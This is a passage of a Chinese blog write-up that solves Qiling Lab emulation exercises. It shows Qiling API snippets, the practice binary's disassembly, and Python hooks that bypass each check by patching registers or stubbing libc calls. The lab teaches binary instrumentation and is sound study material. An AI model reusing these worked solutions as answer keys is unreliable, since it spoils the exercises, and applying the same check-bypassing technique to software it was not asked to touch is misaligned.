  short loc_E35</code>是显然无法满足的，因为-4和-8的位置都被置为0了是相等的，而jl是小于跳转，因此要想办法跳转到loc_E35块上</p><p><strong>读寄存器</strong></p><ul><li>从字符串“eax”读取</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.read(<span class="string">&quot;EAX&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>从 Unicorn Engine const 读取</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.read(UC_X86_REG_EAX)</span><br></pre></td></tr></table></figure><ul><li>读eax</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eax = ql.arch.regs.eax</span><br></pre></td></tr></table></figure><ul><li>将 0xFF 写入“eax”</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.write(&quot;EAX&quot;, 0xFF)</span><br></pre></td></tr></table></figure><ul><li>通过 Unicorn Engine const 将 0xFF 写入 eax</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.write(UC_X86_REG_EAX, <span class="number">0xFF</span>)</span><br></pre></td></tr></table></figure><ul><li>将 0xFF 写入 eax</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.eax =  <span class="number">0xFF</span></span><br></pre></td></tr></table></figure><p>还有一些跨架构寄存器的获取方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.arch_pc</span><br><span class="line">ql.arch.regs.arch_sp  <span class="comment">#这仅适用于 PC 和 SP。</span></span><br><span class="line">ql.arch.regs.arch_pc = <span class="number">0xFF</span></span><br><span class="line">ql.arch.regs.arch_sp = <span class="number">0xFF</span>  <span class="comment">#从当前架构上的 PC/SP 读取，由 ql.arch.type 定义</span></span><br></pre></td></tr></table></figure><ul><li>获取当前arch寄存器表列表</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.register_mapping()</span><br></pre></td></tr></table></figure><ul><li>在 64 位环境中，这将返回 64</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.reg_bits(<span class="string">&quot;rax&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>在 64 位环境中，这将返回 32</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.reg_bits(<span class="string">&quot;eax&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>Hook</strong></p><p>挂钩具体地址。<strong>执行指定地址时将调用已注册的回调。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.hook_address（回调：可调用，地址：int）</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">ql: Qiling</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        ql.log.info(<span class="string">&#x27;killer switch found, stopping&#x27;</span>)</span><br><span class="line">        ql.emu_stop()</span><br><span class="line"></span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;examples/rootfs/x86_windows/bin/wannacry.bin&#x27;</span>], <span class="string">r&#x27;examples/rootfs/x86_windows&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># have &#x27;stop&#x27; called when execution reaches 0x40819a</span></span><br><span class="line">    ql.hook_address(stop, <span class="number">0x40819a</span>)</span><br><span class="line"></span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>挂钩所有说明。注册的回调将在每个汇编指令执行之前调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.hook_code（回调：可调用， user_data ：任何=无）</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> Cs</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_diassembler</span>(<span class="params">ql: Qiling, address: <span class="built_in">int</span>, size: <span class="built_in">int</span>, md: Cs</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    buf = ql.mem.read(address, size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> insn <span class="keyword">in</span> md.disasm(buf, address):</span><br><span class="line">        ql.log.debug(<span class="string">f&#x27;:: <span class="subst">&#123;insn.address:#x&#125;</span> : <span class="subst">&#123;insn.mnemonic:24s&#125;</span> <span class="subst">&#123;insn.op_str&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;examples/rootfs/x8664_linux/bin/x8664_hello&#x27;</span>], <span class="string">r&#x27;examples/rootfs/x8664_linux&#x27;</span>, verbose=QL_VERBOSE.DEBUG)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># have &#x27;simple_disassembler&#x27; called on each instruction, passing a Capstone disassembler instance bound to</span></span><br><span class="line">    <span class="comment"># the underlying architecture as an optional argument</span></span><br><span class="line">    ql.hook_code(simple_diassembler, user_data=ql.arch.disassembler)</span><br><span class="line"></span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>还有一些hook，例如挂钩一段代码、挂钩中断号以调用自定义函数、拦截特定类型的指令等等</p><p>我的想法是在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000E43 39 45 FC                      cmp     [rbp+var_4], eax</span><br></pre></td></tr></table></figure><p>这个地址执行前，在eax里写入1，这样就使得jl条件达成，就成功跳转到成功片段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_eax_1</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;EAX&quot;</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge4</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(write_eax_1,base_addr+<span class="number">0x0E43</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="challenge5"><a href="#challenge5" class="headerlink" title="challenge5"></a>challenge5</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge5</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">14</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">srand</span>(v1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[i] = <span class="number">0</span>;</span><br><span class="line">    v5[i + <span class="number">8</span>] = <span class="built_in">rand</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5[j] != v5[j + <span class="number">8</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是让rand的返回值为0即可</p><p>这里不是系统调用的劫持，而是劫持libc函数，这里看个例子</p><p>与系统调用一样，POSIX libc 函数可以以类似的方式挂钩，从而允许用户控制其功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_INTERCEPT</span><br><span class="line"><span class="keyword">from</span> qiling.os.const <span class="keyword">import</span> STRING</span><br><span class="line"></span><br><span class="line"><span class="comment"># customized POSIX libc methods accept a single argument that refers to the active</span></span><br><span class="line"><span class="comment"># Qiling instance. The Qiling instance may be used to interact with various subsystems,</span></span><br><span class="line"><span class="comment"># such as the memory or registers. The customized method may or may not return a value</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_puts</span>(<span class="params">ql: Qiling</span>):</span><br><span class="line">    <span class="comment"># Qiling offers a few conviniency methods that abstract away the access to the call</span></span><br><span class="line">    <span class="comment"># parameters. specifying the arguments names and types woud allow Qiling to retrieve</span></span><br><span class="line">    <span class="comment"># their values and parse them accordingly.</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># the following call lists a single argument named &#x27;s&#x27;, whose type is &#x27;STRING&#x27;.</span></span><br><span class="line">    <span class="comment"># a dictionary will be created having the key &#x27;s&#x27; mapped to the null-terminated</span></span><br><span class="line">    <span class="comment"># string read from the memory address pointed by the first argument.</span></span><br><span class="line">    params = ql.os.resolve_fcall_params(&#123;<span class="string">&#x27;s&#x27;</span>: STRING&#125;)</span><br><span class="line"></span><br><span class="line">    s = params[<span class="string">&#x27;s&#x27;</span>]</span><br><span class="line">    ql.log.info(<span class="string">f&#x27;my_puts: got &quot;<span class="subst">&#123;s&#125;</span>&quot; as an argument&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># emulate puts functionality</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;rootfs/x8664_linux/bin/x8664_hello&#x27;</span>], <span class="string">r&#x27;rootfs/x8664_linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ql.os.set_api(<span class="string">&#x27;puts&#x27;</span>, my_puts, QL_INTERCEPT.CALL)</span><br><span class="line">    ql.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rand_rets</span>(<span class="params">ql ,*args</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge5</span>(<span class="params">ql</span>):</span><br><span class="line">ql.os.set_api(<span class="string">&#x27;rand&#x27;</span>, rand_rets)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure><h3 id="challenge6"><a href="#challenge6" class="headerlink" title="challenge6"></a>challenge6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000EF6                               public challenge6</span><br><span class="line">.text:0000000000000EF6                               challenge6 proc near                    ; CODE XREF: start+1D7↓p</span><br><span class="line">.text:0000000000000EF6</span><br><span class="line">.text:0000000000000EF6                               var_18= qword ptr -18h</span><br><span class="line">.text:0000000000000EF6                               var_5= byte ptr -5</span><br><span class="line">.text:0000000000000EF6                               var_4= dword ptr -4</span><br><span class="line">.text:0000000000000EF6</span><br><span class="line">.text:0000000000000EF6                               ; __unwind &#123;</span><br><span class="line">.text:0000000000000EF6 55                            push    rbp</span><br><span class="line">.text:0000000000000EF7 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000000EFA 48 89 7D E8                   mov     [rbp+var_18], rdi</span><br><span class="line">.text:0000000000000EFE C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0</span><br><span class="line">.text:0000000000000F05 C6 45 FB 01                   mov     [rbp+var_5], 1</span><br><span class="line">.text:0000000000000F09 EB 07                         jmp     short loc_F12                   ; 零扩展</span><br><span class="line">.text:0000000000000F09</span><br><span class="line">.text:0000000000000F0B                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000F0B</span><br><span class="line">.text:0000000000000F0B                               loc_F0B:                                ; CODE XREF: challenge6+22↓j</span><br><span class="line">.text:0000000000000F0B C7 45 FC 01 00 00 00          mov     [rbp+var_4], 1</span><br><span class="line">.text:0000000000000F0B</span><br><span class="line">.text:0000000000000F12</span><br><span class="line">.text:0000000000000F12                               loc_F12:                                ; CODE XREF: challenge6+13↑j</span><br><span class="line">.text:0000000000000F12 0F B6 45 FB                   movzx   eax, [rbp+var_5]                ; 零扩展</span><br><span class="line">.text:0000000000000F16 84 C0                         test    al, al</span><br><span class="line">.text:0000000000000F18 75 F1                         jnz     short loc_F0B</span><br><span class="line">.text:0000000000000F18</span><br><span class="line">.text:0000000000000F1A 48 8B 45 E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:0000000000000F1E C6 00 01                      mov     byte ptr [rax], 1</span><br><span class="line">.text:0000000000000F21 90                            nop</span><br><span class="line">.text:0000000000000F22 5D                            pop     rbp</span><br><span class="line">.text:0000000000000F23 C3                            retn</span><br><span class="line">.text:0000000000000F23                               ; &#125; // starts at EF6</span><br><span class="line">.text:0000000000000F23</span><br><span class="line">.text:0000000000000F23                               challenge6 endp</span><br></pre></td></tr></table></figure><p>这里会有一个无限循环，<code>movzx   eax, [rbp+var_5]</code>    先eax零扩展赋值为1，之后<code>test    al, al</code>对al进行逻辑与的运算，结果存入ZF中，而jnz是ZF不为0则跳转，显然会有跳转，之后便是无限循环，我的想法 便是hook rax为0即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_rax_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge6</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line">ql.hook_address(write_rax_0,base_addr+<span class="number">0xF16</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_rax_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge6</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line">ql.hook_address(write_rax_0,base_addr+<span class="number">0xF16</span>)</span><br></pre></td></tr></table></figure><h3 id="challenge7"><a href="#challenge7" class="headerlink" title="challenge7"></a>challenge7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000F24                               public challenge7</span><br><span class="line">.text:0000000000000F24                               challenge7 proc near                    ; CODE XREF: start+1FB↓p</span><br><span class="line">.text:0000000000000F24</span><br><span class="line">.text:0000000000000F24                               var_8= qword ptr -8</span><br><span class="line">.text:0000000000000F24</span><br><span class="line">.text:0000000000000F24                               ; __unwind &#123;</span><br><span class="line">.text:0000000000000F24 55                            push    rbp</span><br><span class="line">.text:0000000000000F25 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000000F28 48 83 EC 10                   sub     rsp, 10h</span><br><span class="line">.text:0000000000000F2C 48 89 7D F8                   mov     [rbp+var_8], rdi</span><br><span class="line">.text:0000000000000F30 48 8B 45 F8                   mov     rax, [rbp+var_8]</span><br><span class="line">.text:0000000000000F34 C6 00 01                      mov     byte ptr [rax], 1</span><br><span class="line">.text:0000000000000F37 BF FF FF FF FF                mov     edi, 0FFFFFFFFh                 ; seconds</span><br><span class="line">.text:0000000000000F3C E8 0F FB FF FF                call    _sleep</span><br><span class="line">.text:0000000000000F3C</span><br><span class="line">.text:0000000000000F41 90                            nop</span><br><span class="line">.text:0000000000000F42 C9                            leave</span><br><span class="line">.text:0000000000000F43 C3                            retn</span><br><span class="line">.text:0000000000000F43                               ; &#125; // starts at F24</span><br><span class="line">.text:0000000000000F43</span><br><span class="line">.text:0000000000000F43                               challenge7 endp</span><br></pre></td></tr></table></figure><p>这里有两种想法，第一种便是修改rdi，在call sleep前将rdi改为0，第二种便是hook掉sleep，直接return</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_rdi_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rdi&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sleep</span>(<span class="params">ql,*args</span>):</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge7</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line"><span class="comment">#ql.os.set_api(&#x27;sleep&#x27;, my_sleep)</span></span><br><span class="line">ql.hook_address(write_rdi_0,base_addr+<span class="number">0x00F3C</span>)</span><br></pre></td></tr></table></figure><h3 id="challenge8"><a href="#challenge8" class="headerlink" title="challenge8"></a>challenge8</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall challenge8(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // rax</span><br><span class="line">  _DWORD *v2; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = malloc(0x18uLL);</span><br><span class="line">  *(_QWORD *)v2 = malloc(0x1EuLL);</span><br><span class="line">  v2[<span class="number">2</span>] = <span class="number">0x539</span>;</span><br><span class="line">  v2[<span class="number">3</span>] = <span class="number">0x3DFCD6EA</span>;</span><br><span class="line">  strcpy(*(char **)v2, <span class="string">&quot;Random data&quot;</span>);</span><br><span class="line">  result = v2;</span><br><span class="line">  *((_QWORD *)v2 + <span class="number">2</span>) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题的target是**Unpack the struct and write at the target address.**解包结构体，然后写入目标地址</p><p>那么我的想法就是在malloc之后hook将rax返回值存入，但是我突然想到，之前我们不是刚学了如何搜索内存的吗，那么我们先通过搜索内存获得地址，然后再写入a1会不会更高端一点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">search_mem</span>(<span class="params">ql</span>):</span><br><span class="line">MAGIC=<span class="number">0x3DFCD6EA00000539</span></span><br><span class="line">struct_address = ql.mem.search(p64(MAGIC))</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> struct_address <span class="keyword">or</span> <span class="built_in">len</span>(struct_address) &lt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;struct_address is not properly initialized&quot;</span>)</span><br><span class="line">mem_value1, mem_value2 ,mem_value3 = struct.unpack(<span class="string">&quot;QQQ&quot;</span>, ql.mem.read(struct_address[<span class="number">0</span>]-<span class="number">8</span>,<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug1&quot;</span>,<span class="built_in">hex</span>(mem_value1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug2&quot;</span>,<span class="built_in">hex</span>(mem_value2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug3&quot;</span>,<span class="built_in">hex</span>(mem_value3))</span><br><span class="line">ql.mem.write(mem_value3, <span class="string">b&quot;\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge8</span>(<span class="params">ql</span>):</span><br><span class="line">base = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(search_mem, base+<span class="number">0xFB5</span>)</span><br></pre></td></tr></table></figure><h3 id="challenge9"><a href="#challenge9" class="headerlink" title="challenge9"></a>challenge9</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge9</span><span class="params">(<span class="type">bool</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(src, <span class="string">&quot;aBcdeFghiJKlMnopqRstuVWxYz&quot;</span>);</span><br><span class="line">  src[<span class="number">27</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">for</span> ( i = dest; *i; ++i )</span><br><span class="line">    *i = <span class="built_in">tolower</span>(*i);</span><br><span class="line">  *a1 = <span class="built_in">strcmp</span>(src, dest) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个想法就是直接hook掉strcmp函数，或者也可以hook掉tolower函数</p><p>这里尽量hook tolower函数，不然下题就做不了啦~~~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_strcmp</span>(<span class="params">ql,*args</span>) -&gt; <span 